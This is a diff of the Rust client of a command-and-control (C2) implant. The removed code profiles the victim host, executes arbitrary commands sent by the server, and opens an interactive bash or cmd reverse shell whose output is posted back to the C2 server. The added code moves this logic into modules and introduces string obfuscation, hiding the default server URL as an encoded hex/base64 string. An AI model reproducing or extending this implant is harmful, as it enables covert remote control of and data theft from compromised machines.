@@ -1,92 +1,27 @@
+use cryptify;
 use reqwest::Client;
-use std::process::Stdio;
 use std::time::Duration;
-use tokio::io::{AsyncBufReadExt, BufReader};
-use tokio::process::Command;
 use tokio::time::sleep;
-use uuid::Uuid;
+
+mod client_info;
+mod command_executor;
+mod gadgets;
 
 use common::config::ClientConfig;
-use common::error::{C2Error, C2Result};
-use common::{
-    message::{ClientInfo, CommandRequest, CommandResponse, Message, MessageType, ShellData},
-    sysinfo::{get_country, get_hardware_info, get_hostname, get_local_ip},
-};
+use common::error::C2Result;
+use common::message::{CommandRequest, Message, MessageType};
+use gadgets::simple_decode;
 
 /// C2 Client
 pub struct C2Client {
     config: ClientConfig,
     http_client: Client,
-    client_info: ClientInfo,
+    client_info: common::message::ClientInfo,
 }
 
 impl C2Client {
     pub async fn new(config: ClientConfig) -> C2Result<Self> {
-        // Made async
-        let client_id = config
-            .client_id
-            .clone()
-            .unwrap_or_else(|| Uuid::new_v4().to_string());
-
-        let hardware_info_str = get_hardware_info()
-            .map_err(|e| C2Error::Other(format!("Failed to get hardware info: {e}")))?;
-        let hardware_info: serde_json::Value = serde_json::from_str(&hardware_info_str)
-            .map_err(|e| C2Error::Other(format!("Failed to parse hardware info: {e}")))?;
-
-        let ip = get_local_ip()
-            .unwrap_or_else(|_| "127.0.0.1".parse().unwrap())
-            .to_string();
-
-        // Move the blocking get_country call to a blocking task
-        let country_info = tokio::task::spawn_blocking({
-            let ip_clone = ip.clone(); // Clone ip for the closure
-            move || get_country(ip_clone).ok()
-        })
-        .await
-        .map_err(|e| {
-            C2Error::Other(format!(
-                "Failed to spawn blocking task for country info: {e}"
-            ))
-        })?;
-
-        let client_info = ClientInfo {
-            id: client_id,
-            hostname: get_hostname().unwrap_or_else(|_| "unknown".to_string()),
-            username: std::env::var("USER")
-                .or_else(|_| std::env::var("USERNAME"))
-                .unwrap_or_else(|_| "unknown".to_string()),
-            os: std::env::consts::OS.to_string(),
-            arch: std::env::consts::ARCH.to_string(),
-            ip,
-            country_info,
-            cpu_brand: hardware_info
-                .get("cpu_brand")
-                .and_then(|v| v.as_str())
-                .unwrap_or("unknown")
-                .to_string(),
-            cpu_frequency: hardware_info
-                .get("cpu_frequency_MHz")
-                .and_then(|v| v.as_u64())
-                .unwrap_or(0),
-            cpu_cores: hardware_info
-                .get("cpu_cores")
-                .and_then(|v| v.as_u64())
-                .unwrap_or(0) as usize,
-            memory: hardware_info
-                .get("memory_GB")
-                .and_then(|v| v.as_u64())
-                .unwrap_or(0),
-            total_disk_space: hardware_info
-                .get("total_disk_space_GB")
-                .and_then(|v| v.as_u64())
-                .unwrap_or(0),
-            available_disk_space: hardware_info
-                .get("available_disk_space_GB")
-                .and_then(|v| v.as_u64())
-                .unwrap_or(0),
-            connected_at: chrono::Utc::now(),
-            last_seen: chrono::Utc::now(),
-        };
+        let client_info = client_info::build_client_info(config.client_id.clone()).await?;
 
         Ok(Self {
             config,
@@ -129,7 +64,7 @@ impl C2Client {
         if res.status().is_success() {
             println!("Client registered successfully.");
         } else {
-            return Err(C2Error::Network(format!(
+            return Err(common::error::C2Error::Network(format!(
                 "Failed to register: {}",
                 res.status()
             )));
@@ -165,121 +100,18 @@ impl C2Client {
         if res.status().is_success() {
             let commands: Vec<CommandRequest> = res.json().await?;
             for cmd in commands {
-                if let Err(e) = self.execute_command(cmd).await {
+                if let Err(e) = command_executor::execute_command(
+                    &self.http_client,
+                    &self.config.server_url,
+                    &self.client_info.id,
+                    cmd,
+                )
+                .await
+                {
                     eprintln!("Error executing command: {e}");
                 }
             }
         }
-        Ok(())
-    }
-
-    /// Execute a single command
-    async fn execute_command(&self, cmd: CommandRequest) -> C2Result<()> {
-        println!("Executing command: {}", cmd.command);
-
-        if cmd.command == "REVERSE_SHELL" {
-            if let Some(session_id) = cmd.args.first() {
-                return self.start_reverse_shell(session_id.clone().to_string()).await;
-            } else {
-                return Err(C2Error::Other(
-                    "Reverse shell command missing session_id".into(),
-                ));
-            }
-        }
-
-        let output = if cfg!(target_os = "windows") {
-            Command::new("cmd")
-                .args(["/C", &cmd.command])
-                .args(&cmd.args)
-                .output()
-                .await?
-        } else {
-            Command::new("sh")
-                .arg("-c")
-                .arg(format!("{} {}", cmd.command, cmd.args.join(" ")))
-                .output()
-                .await?
-        };
-
-        let result = CommandResponse {
-            client_id: self.client_info.id.clone(),
-            command: cmd.command.clone(),
-            stdout: String::from_utf8_lossy(&output.stdout).to_string(),
-            stderr: String::from_utf8_lossy(&output.stderr).to_string(),
-            exit_code: output.status.code().unwrap_or(-1),
-            executed_at: chrono::Utc::now(),
-        };
-
-        self.send_command_result(result).await
-    }
-
-    /// Send the result of a command back to the server
-    async fn send_command_result(&self, result: CommandResponse) -> C2Result<()> {
-        let payload = serde_json::to_vec(&result)?;
-        let message = Message::new(MessageType::CommandResult, payload);
-
-        self.http_client
-            .post(format!("{}/api/command_result", self.config.server_url))
-            .json(&message)
-            .send()
-            .await?;
-        Ok(())
-    }
-
-    /// Start a reverse shell connection
-    async fn start_reverse_shell(&self, session_id: String) -> C2Result<()> {
-        println!("Starting reverse shell for session {session_id}...");
-        let mut shell_process = if cfg!(target_os = "windows") {
-            Command::new("cmd")
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .spawn()?
-        } else {
-            Command::new("/bin/bash")
-                .arg("-i")
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .stderr(Stdio::piped())
-                .spawn()?
-        };
-
-        let stdout = shell_process
-            .stdout
-            .take()
-            .ok_or(C2Error::Other("Failed to get stdout".into()))?;
-
-        let http_client = self.http_client.clone();
-        let server_url = self.config.server_url.clone();
-
-        tokio::spawn(async move {
-            let mut reader = BufReader::new(stdout);
-            loop {
-                let mut buf = Vec::new();
-                match reader.read_until(b'\n', &mut buf).await {
-                    Ok(0) => break, // EOF
-                    Ok(_) => {
-                        let shell_data = ShellData::new(session_id.clone(), buf);
-                        let payload = serde_json::to_vec(&shell_data).unwrap();
-                        let message = Message::new(MessageType::ShellData, payload);
-
-                        if let Err(e) = http_client
-                            .post(format!("{server_url}/api/shell_data"))
-                            .json(&message)
-                            .send()
-                            .await
-                        {
-                            eprintln!("Failed to send shell data: {e}");
-                        }
-                    }
-                    Err(e) => {
-                        eprintln!("Error reading from shell stdout: {e}");
-                        break;
-                    }
-                }
-            }
-        });
-
         Ok(())
     }
 }
@@ -287,12 +119,11 @@ impl C2Client {
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args: Vec<String> = std::env::args().collect();
-    let server_url = args
-        .get(1)
-        .map(|s| s.to_string())
-        .unwrap_or_else(|| "http://127.0.0.1:8080".to_string());
+    let server_url = args.get(1).map(|s| s.to_string()).unwrap_or_else(|| {
+        simple_decode("6148523063446f764c327876593246736147397a64446f344d446777")
+    });
 
-    let config = ClientConfig::default(); // Use default config
+    let config = ClientConfig::default();
     let mut client = C2Client::new(ClientConfig {
         server_url,
         ..config
